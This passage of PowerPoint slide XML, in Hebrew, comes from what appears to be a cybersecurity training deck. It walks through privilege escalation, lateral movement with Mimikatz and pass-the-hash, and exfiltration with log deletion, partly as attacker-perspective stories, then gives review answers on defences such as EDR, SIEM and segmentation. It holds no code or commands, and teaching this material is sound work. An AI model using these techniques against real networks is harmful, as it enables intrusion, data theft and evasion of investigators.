              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Administrator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> וכך להשיג שליטה מלאה על השרת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Kernel Exploits</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: ניצול </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בליבת מערכת ההפעלה כדי להשיג הרשאות גבוהות יותר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Password Spraying</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ניסיון להתחבר עם סיסמאות נפוצות למשתמשים רבים כדי למצוא חשבון עם הרשאות גבוהות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמאות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Exploiting Misconfigurations</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ניצול תצורות שגויות במערכת להשגת הרשאות גבוהות יותר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Password Cracking</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>פיצוח סיסמאות של משתמשים בעלי הרשאות גבוהות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3926683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B11742-3E2B-4916-A703-5D0F1D669793}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1192696" y="642594"/>
            <a:ext cx="9932504" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שלב 6: תנועה רוחבית </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Lateral Movement</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{07D1DC67-9268-422E-9595-858BB82D769C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בשלב זה, התוקף נע בין המערכות השונות ברשת כדי להשיג מטרות נוספות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>עכשיו כשאתה מנהל מערכת, אתה מחפש גישה למערכות נוספות ברשת. אתה מוצא מחשב נוסף שמחזיק במידע רגיש ומעתיק אליו את התוכנה הזדונית שלך.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כלי לזיהוי והרצה של סיסמאות במערכת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Windows</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :SSH Hijacking</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>השתלטות על חיבורי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> SSH</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>פעילים כדי לגשת למערכות נוספות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמאות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Pass-the-Hash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שימוש במידע</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>hashed </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של סיסמאות כדי להתחבר למערכות אחרות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Remote Desktop Protocol (RDP)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ניצול חיבורי רשת מרוחקים לגישה למערכות נוספות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1857529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1A23A18-B0B9-4D8C-B27A-301AE2AE2907}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="258418" y="642594"/>
            <a:ext cx="11701670" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שלב 7: יציאה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Exfiltration and Covering Tracks</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3B61348C-3BC7-40B6-985A-2FEBFFCBD4CB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בשלב זה, התוקף מעביר את המידע שהשיג מחוץ לרשת היעד ומכסה את עקבותיו כדי למנוע זיהוי.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אחרי שאספת את המידע הרגיש, אתה מעביר אותו לשרת חיצוני באמצעות פרוטוקול מוצפן, ולאחר מכן מוחק את כל העקבות שלך מהמחשבים שבהם השתמשת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Data Encryption</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הצפנת המידע המועבר כדי למנוע זיהוי ויירוט.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Anti-Forensic Tools</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: כלים שנועדו להסתיר או למחוק עקבות דיגיטליות, כמו מחיקת קבצים עם נתונים אקראיים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמאות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Data Exfiltration</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>העברת מידע רגיש מחוץ לרשת היעד.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Log Deletion</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מחיקת יומני רישום כדי להקשות על איתור הפעילות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="29508610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CBA458A-B4E5-41F1-94E5-CE4CD22AB97A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4194312" y="553142"/>
            <a:ext cx="6930887" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך – שלבי ביצוע תקיפה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CBADCEF3-51F5-4DBE-B168-075D7231119F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שאלות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. מהם השלבים הקריטיים ביותר בתהליך התקיפה, לדעתך?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. כיצד כל שלב משפיע על הסיכויים של התוקף להצליח?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. מהי החשיבות של מודעות ואימון עובדים בהגנה מפני התקפות?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. אילו כלים וטכניקות יכולים לשמש להגנה על מערכות מפני כל שלב בתקיפה?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3458295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8347F23-9B1C-4914-82AE-6FDD927B9AE2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2663688" y="642594"/>
            <a:ext cx="8461512" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך – שלבי ביצוע תקיפה (תשובות)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{50D93F0B-6C6C-4DEF-83E6-70D48143F7AF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. כל שלב בתהליך התקיפה הוא קריטי להצלחת התוקף, אך ישנם שלבים שממש בולטים בחשיבותם:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>א. איסוף מודיעין: ללא מידע ראשוני על היעד, התוקף לא יוכל לדעת כיצד לגשת אליו או אילו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> קיימות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ב. גישה ראשונית: זהו השלב שבו התוקף מצליח לפרוץ לראשונה למערכת היעד. אם השלב הזה נכשל, כל התקיפה נכשלת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ג. השגת אחיזה: לאחר קבלת גישה, התוקף חייב להבטיח שהוא יכול לשמור על הגישה הזו ולהישאר בלתי נראה ככל האפשר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ד. הסלמת הרשאות: השגת הרשאות גבוהות יותר מאפשרת לתוקף שליטה רחבה יותר על המערכת ויכולת לבצע פעולות נוספות מבלי להיתקל במגבלות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="919168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8F7C1F-1C2C-419F-BD25-BFE525D46AD4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1858616" y="642594"/>
            <a:ext cx="9266583" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך – שלבי ביצוע תקיפה (תשובות)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8399BF4B-BB6A-40E9-82FF-66A6B1751FA2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איסוף מודיעין: שלב זה קובע את היכולת של התוקף לדעת בדיוק היכן ואיך לתקוף. איסוף מודיעין איכותי יכול להקל על מציאת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ומטרות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סריקה: מאפשר לתוקף לדעת בדיוק אילו שירותים פועלים ואילו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> קיימות במערכת היעד, מה שמגדיל את הסיכויים למצוא נקודת כניסה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>גישה ראשונית: הצלחה בגישה הראשונית היא קריטית; בלעדיה התוקף לא יוכל להמשיך לשלב הבא. גישה ראשונית מוצלחת יכולה גם לקבוע את רמת הנראות של התוקף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>השגת אחיזה: תוקף שמצליח להשיג אחיזה יציבה במערכת יכול להמשיך לפעול ולבצע פעולות נוספות מבלי להיחשף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הסלמת הרשאות: מאפשרת לתוקף לשלוט על יותר משאבים במערכת ולבצע פעולות רגישות יותר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תנועה רוחבית: משפרת את הגישה של התוקף למערכות נוספות ומאפשרת לו להגיע למידע רגיש או לשבש פעולות נוספות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יציאה: שלב זה משפיע על יכולתו של התוקף להימנע מגילוי ועל היכולת להוציא מידע מחוץ למערכת.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5950812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D4DB48-5308-44D7-81AE-DB56CC8AC73D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1888434" y="642594"/>
            <a:ext cx="9236765" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך – שלבי ביצוע תקיפה (תשובות)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{454BDD5A-A94E-4B8E-AAA4-0C201A17E694}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מודעות ואימון עובדים הם קריטיים להגנה מפני התקפות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>א. מניעת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פישינג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: עובדים מודעים יוכלו לזהות הודעות דוא"ל מזויפות ולהימנע מלחיצה על קישורים זדוניים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ב. זיהוי פעילות חשודה: עובדים מיומנים יוכלו לזהות פעילויות חשודות ולדווח עליהן במהירות, מה שמאפשר תגובה מהירה של צוות האבטחה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ג. עמידה בתהליכי אבטחה: הכשרת העובדים לעמידה בתהליכי אבטחה כמו ניהול סיסמאות, שימוש בכלים מוצפנים וניהול גישה, יכולה למנוע מהתוקף לנצל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> אנושיות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1027155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EE1791-1F3C-4612-B567-0777FCE34FCB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1888434" y="642594"/>
            <a:ext cx="9236765" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך – שלבי ביצוע תקיפה (תשובות)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{921F3520-7BE4-44F9-B0D6-F38E85AF17B1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איסוף מודיעין: כלים לזיהוי פעילות מודיעינית כמו ניטור רשתות חברתיות ומערכות ניטור איומים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Threat Intelligence</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סריקה: שימוש בכלי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDS/IPS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לזיהוי סריקות רשת ומניעתן.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>גישה ראשונית: שימוש באנטי וירוס, חומות אש וניהול גישה מבוסס תפקידים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> RBAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי להגן על המערכות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>השגת אחיזה: ניהול עדכונים ושימוש בכלי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> EDR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לזיהוי תוכנות זדוניות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הסלמת הרשאות: שימוש בכלי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> SIEM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לניטור פעילות חריגה וניהול </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תנועה רוחבית: ניהול רשתות ושימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>segmentation </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי להגביל את היכולת לנוע בין מערכות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יציאה: הצפנת מידע, ניטור יציאת מידע ותיעוד לוגים כדי למנוע העברת מידע רגיש ולהבטיח תגובה מהירה למקרי חשד.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
